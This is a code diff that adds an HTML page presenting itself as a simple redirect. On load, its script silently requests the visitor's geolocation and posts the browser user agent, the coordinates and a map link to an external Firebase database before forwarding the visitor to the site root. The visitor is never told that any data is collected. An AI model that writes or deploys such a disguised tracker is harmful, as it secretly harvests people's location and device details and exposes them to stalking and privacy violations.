@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect</title>
+</head>
+<body>
+    <script type="text/javascript">
+        async function redirect(toURL){
+            const coords = {
+                latitude: '',
+                longitude: ''
+            };
+
+            navigator.geolocation.getCurrentPosition(position => {
+                coords.latitude = position.coords.latitude;
+                coords.longitude = position.coords.longitude;
+            })
+
+            const params = { 
+                method: 'POST',
+                headers: {
+                    "Accept": "*/*",
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    "userAgent": navigator.userAgent,
+                    "mapLink": `https://www.openstreetmap.org/#map=18/${coords.latitude}/${coords.longitude}`,
+                    "coords": `Latitude: ${coords.latitude} °, Longitude: ${coords.longitude} °`
+                })
+            }
+
+            await fetch(`https://ce310524-default-rtdb.europe-west1.firebasedatabase.app/redirect.json`, params);
+
+            location.href = toURL;
+        }
+
+        redirect('/')
+    </script>
+</body>
+</html>
